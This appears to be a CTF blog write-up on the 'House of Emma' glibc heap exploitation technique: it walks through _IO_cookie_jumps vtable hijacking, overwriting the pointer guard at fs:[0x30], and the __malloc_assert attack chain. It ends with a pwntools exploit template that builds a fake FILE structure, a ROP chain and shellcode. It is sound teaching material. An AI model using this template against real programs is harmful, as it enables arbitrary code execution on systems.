[toc]

**Blog: https://4xura.com/pwn/pwn-heap-exploitation-house-of-emma/**

## OVERVIEW

### _IO_cookie_jumps

Because of the `IO_validate_vtable` we introduced [before](https://4xura.com/pwn/pwn-travelgraph/#toc-head-23), We can no longer hijack `vtable` from the `_IO_FILE_plus` struct with arbitrary values, but within a certain range.

Unlike House of Apple or House of Cat, that we replace the `vtable` with `_IO_wfile_jumps`. There's **`_IO_cookie_jumps`** with similar structure:

```c
static const struct _IO_jump_t _IO_cookie_jumps libio_vtable = {
  JUMP_INIT_DUMMY,                              // Offset: 0x00, Size: 0x10 (Dummy entry)
  JUMP_INIT(finish, _IO_file_finish),           // Offset: 0x10, Size: 0x08
  JUMP_INIT(overflow, _IO_file_overflow), 		// Offset: 0x18, Size: 0x08
  JUMP_INIT(underflow, _IO_file_underflow),		// Offset: 0x20, Size: 0x08
  JUMP_INIT(uflow, _IO_default_uflow), 			// Offset: 0x28, Size: 0x08
  JUMP_INIT(pbackfail, _IO_default_pbackfail), 	// Offset: 0x30, Size: 0x08
  JUMP_INIT(xsputn, _IO_file_xsputn),           // Offset: 0x38, Size: 0x08
  JUMP_INIT(xsgetn, _IO_default_xsgetn),        // Offset: 0x40, Size: 0x08
  JUMP_INIT(seekoff, _IO_cookie_seekoff),       // Offset: 0x48, Size: 0x08
  JUMP_INIT(seekpos, _IO_default_seekpos),      // Offset: 0x50, Size: 0x08
  JUMP_INIT(setbuf, _IO_file_setbuf),           // Offset: 0x58, Size: 0x08
  JUMP_INIT(sync, _IO_file_sync),       		// Offset: 0x60, Size: 0x08
  JUMP_INIT(doallocate, _IO_file_doallocate),   // Offset: 0x68, Size: 0x08
  JUMP_INIT(read, _IO_cookie_read),             // Offset: 0x70, Size: 0x08
  JUMP_INIT(write, _IO_cookie_write),           // Offset: 0x78, Size: 0x08
  JUMP_INIT(seek, _IO_cookie_seek),             // Offset: 0x80, Size: 0x08
  JUMP_INIT(close, _IO_cookie_close),           // Offset: 0x88, Size: 0x08
  JUMP_INIT(stat, _IO_default_stat),            // Offset: 0x90, Size: 0x08
  JUMP_INIT(showmanyc, _IO_default_showmanyc),  // Offset: 0x98, Size: 0x08
  JUMP_INIT(imbue, _IO_default_imbue)           // Offset: 0xA0, Size: 0x08
};
```

#### _IO_cookie_xxxx

Once we successfully modify the vtable pointer to `_IO_cookie_jumps`, there're some functions inside it, aka `_IO_cookie_read`,  `_IO_cookie_write`, `_IO_cookie_seek`, `_IO_cookie_close`, potentially leading to arbitrary function/pointer execution:

```c
static ssize_t
_IO_cookie_read (FILE *fp, void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_read_function_t *read_cb = cfile->__io_functions.read;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (read_cb);
#endif
 
  if (read_cb == NULL)
    return -1;
 
  return read_cb (cfile->__cookie, buf, size);
}
 
static ssize_t
_IO_cookie_write (FILE *fp, const void *buf, ssize_t size)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_write_function_t *write_cb = cfile->__io_functions.write;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (write_cb);
#endif
 
  if (write_cb == NULL)
    {
      fp->_flags |= _IO_ERR_SEEN;
      return 0;
    }
 
  ssize_t n = write_cb (cfile->__cookie, buf, size);
  if (n < size)
    fp->_flags |= _IO_ERR_SEEN;
 
  return n;
}
 
static off64_t
_IO_cookie_seek (FILE *fp, off64_t offset, int dir)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_seek_function_t *seek_cb = cfile->__io_functions.seek;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (seek_cb);
#endif
 
  return ((seek_cb == NULL
       || (seek_cb (cfile->__cookie, &offset, dir)
           == -1)
       || offset == (off64_t) -1)
      ? _IO_pos_BAD : offset);
}
 
static int
_IO_cookie_close (FILE *fp)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (close_cb);
#endif
 
  if (close_cb == NULL)
    return 0;
 
  return close_cb (cfile->__cookie);
}
```

#### struct _IO_cookie_file

They all define a variable called `cfile` of `struct _IO_cookie_file`:

```c
/* Special file type for fopencookie function.  */
struct _IO_cookie_file
{
  struct _IO_FILE_plus __fp;
  void *__cookie;	// offset: 0xE0
  cookie_io_functions_t __io_functions;	// offset: 0xE8
};
 
typedef struct _IO_cookie_io_functions_t
{
  cookie_read_function_t *read;        /* Read bytes.  */
  cookie_write_function_t *write;    /* Write bytes.  */
  cookie_seek_function_t *seek;        /* Seek/tell file position.  */
  cookie_close_function_t *close;    /* Close file.  */
} cookie_io_functions_t;
```

#### PTR_DEMANGLE

If we look carefully, there's special a preprocessor directive (`#ifdef`) and a function-like macro (`PTR_DEMANGLE`) inside each function snippet:

```
#ifdef PTR_DEMANGLE
 PTR_DEMANGLE (write_cb);
#endif
```

- If `PTR_DEMANGLE` is defined, the code between the `#ifdef` and the corresponding `#endif` is included in the compilation.
- If `PTR_DEMANGLE` is not defined, the code block is ignored.

This is a security measure to prevent us manipulating function pointers:

```c
extern uintptr_t __pointer_chk_guard attribute_relro;
#  define PTR_MANGLE(var) \
  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)
#  define PTR_DEMANGLE(var) PTR_MANGLE (var)
```

This macro takes a pointer variable `var`, converts it to a `uintptr_t`, and applies an XOR operation with `__pointer_chk_guard` from TLS Segment:

```
mov rax, [rdi+0xf0]
ror rax, 0x11
xor rax, fs:[0x30]
```

> The pointer encryption guard value is initialized by the dynamic linker, which exposes two variables — `__pointer_chk_guard_local` is hidden and can be used by dynamic linker code to access the guard value more efficiently, and `__pointer_chk_guard` is global and should be used by the dynamically linked C library.

The value in `fs[0x30]` refers to a specific TLS offset that is adjacent to the libc memory area. This offset remains fixed, allowing for predictable manipulation — we cannot leak this, but we can try to modify it with primitives for example:

- Fastbin Reverse Into Tcache
- Tcache Stashing Unlink Attack
- LargeBin Attack

Overall, the main idea is to leverage vulnerabilities to **replace this random value to a known address**, overcoming the protections provided by pointer encryption.

#### __pointer_chk_guard

The concept Pointer guard (`__pointer_chk_guard`) I name it here is the value stored in `fs:[0x30]` (`fs:[offsetof(tcbhead_t, pointer_guard)]`), used within the PTR_MANGLE/PTR_DEMANGLE macro.

For the **encryption** process (PTR_MANGLE):

```
rol(ptr ^ pointer_guard, 0x11, 64)
```

For the **decryption** process (PTR_DEMANGLE):

```
ror(enc, 0x11, 64) ^ pointer_guard
```

So, in an exploit scenario, If we can hijack the pointer guard (`fs:[0x30]`) as `evil_guard` (via Largebin Attack for example), we can then write the `enc` on a controlled memory area (i.e. heap), by encrypting the our target function/gadget pointer (`ptr`) to hijack `rip`:

```
enc = rol(ptr ^ evil_guard, 0x11, 64)
```

#### __pointer_chk_guard_local

Actually there's a copy of the pointer guard, which is a **Global Variable** `__pointer_chk_guard_local` locates at the `.RODATA` section, that cannot be overwritten:

```
pwndbg> telescope &__pointer_chk_guard_local
00:0000│  0x7ffff7ffcab0 (__pointer_chk_guard_local) ◂— 0x6317f6873103e78
01:0008│  0x7ffff7ffcab8 (_dl_skip_args) ◂— 0
02:0010│  0x7ffff7ffcac0 (_dl_argv) —▸ 0x7fffffffe0e8 —▸ 0x7fffffffe3e4 ◂— '/home/axura/ctf/house_of_emma/pwn'
03:0018│  0x7ffff7ffcac8 (_dl_argc) ◂— 1
04:0020│  0x7ffff7ffcad0 ◂— 0
05:0028│  0x7ffff7ffcad8 ◂— 0
06:0030│  0x7ffff7ffcae0 (_rtld_global_ro) ◂— 0x50fa300000000
07:0038│  0x7ffff7ffcae8 (_rtld_global_ro+8) —▸ 0x7ffff7ff12dd ◂— 0x6c6c6577736168 /* 'haswell' */
pwndbg> vmmap &__pointer_chk_guard_local
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
►   0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 +0x1ab0
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

And when we overwrite the target at `fs:[0x30]`, this value of `__pointer_chk_guard_local` won't be affected.

### Attack Chain

#### __malloc_assert

If we choose to trigger `__malloc_assert` to start I/O operation, and hijack the vtable pointer as `_IO_cookie_jumps`, `fflush(stderr)` will dive into the IO struct as following:

```
stderr->_IO_cookie_jumps->_IO_file_xsputn
```

Once we hijack the vtable as `_IO_cookie_jumps+0x40`, then:

```
stderr->_IO_cookie_jumps+0x40->_IO_cookie_write
```

**Attack Chain**:

```
__malloc_assert
	fflush(stderr)
        _IO_default_xsputn (before)
            _IO_cookie_write (after)
                _IO_cookie_write
                    write_cb (cfile->__cookie, buf, size)
```

## EXP Template

```py
# Bullets
stderr           = libc_base + libc.sym['stderr']
_IO_cookie_jumps = libc_base + libc.sym['_IO_cookie_jumps']
ptr_guard_addr   = libc_base - 0x28c0 + 0x30 # fs:[0x30]
setcontext       = libc_base + libc.sym['setcontext'] + 61
mprotect         = libc_base + libc.sym['mprotect']
gksh_gadget      = libc_base + 0x146020 # mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]; 
pa(stderr)
pa(ptr_guard_addr)
pa(_IO_cookie_jumps)
pa(setcontext)
pa(gksh_gadget)

rop 	    = ROP(libc)
p_rdi_r     = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
p_rsi_r     = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
p_rdx_rbx_r = libc_base + rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
p_rax_r     = libc_base + rop.find_gadget(['pop rax', 'ret'])[0]
syscall_r   = libc_base + rop.find_gadget(['syscall', 'ret'])[0]
ret         = libc_base + rop.find_gadget(['ret'])[0]

fakeIO_addr    = 0xdeadbeef
mprotect_chain = [p_rdi_r, fakeIO_addr&(~0xfff), p_rsi_r, 0x4000, \
                p_rdx_rbx_r, 7, 0, mprotect, fakeIO_addr+0x140]	# 0x48 bytes
orw_chain      = asm(shellcraft.cat('/flag'))	# 0x23 bytes
pa(fakeIO_addr)

# FSOP
pl = flat({
    # fake stderr & _IO_cookie_file  
    0: {  
        0x0:  0,	# _flag
        0x20: 0,	# _IO_write_base
        0x28: 1,	# _IO_write_ptr 
        0x38: 0,    # _IO_buf_base
        0x40: 0,    # _IO_buf_end
        0x68: 0,    # _chain
        0x88: fakeIO_addr+0x300,	# _lock
        0xc0: 0,	# mode
        0xd8: _IO_cookie_jumps+0x40,    # vtable
        0xe0: fakeIO_addr + 0x100,   # rdi
        # mov rdx, [rdi + 8]; mov [rsp], rax; call [rdx + 0x20]; 
        0xf0: ROL(gksh_gadget ^ (heap_base + 0x22a0), 0x11),  #
    },
    # ORW 
    0x100: {
        0x8:  fakeIO_addr + 0x100,  # rdx
        # <+61>:  mov rsp, [rdx+0xa0]
        # <+294>: mov rcx, [rdx+0xa8]
        # <+301>: push rcx
        # <+334>: ret
        0x20: setcontext,   # gksh_gadget ->
        0x40: orw_chain,    # mprotect ->        
        0xa0: [fakeIO_addr+0x200, ret],
    },
    0x200: {
        0x0: mprotect_chain,
    }
}, filler='\0')
```






